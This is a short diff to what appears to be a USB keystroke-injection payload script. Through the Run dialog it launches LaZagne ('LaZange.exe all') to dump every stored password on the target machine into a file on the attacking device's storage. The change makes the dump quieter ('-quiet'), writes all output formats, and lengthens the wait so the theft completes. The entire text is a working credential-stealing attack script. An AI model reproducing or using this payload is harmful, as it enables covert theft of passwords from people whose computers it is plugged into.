@@ -7,7 +7,7 @@ ATTACKMODE HID STORAGE
 DELAY 1000
 GUI r
 DELAY 200
-STRING cmd /c "D: && LaZange.exe all -vv -oN -output D:\lazagne_output.txt"
+STRING cmd /c "D: && LaZange.exe all -vv -quiet -oA -output D:\lazagne_output.txt"
 ENTER
-DELAY 200
+DELAY 20000
 STRINGLN exit
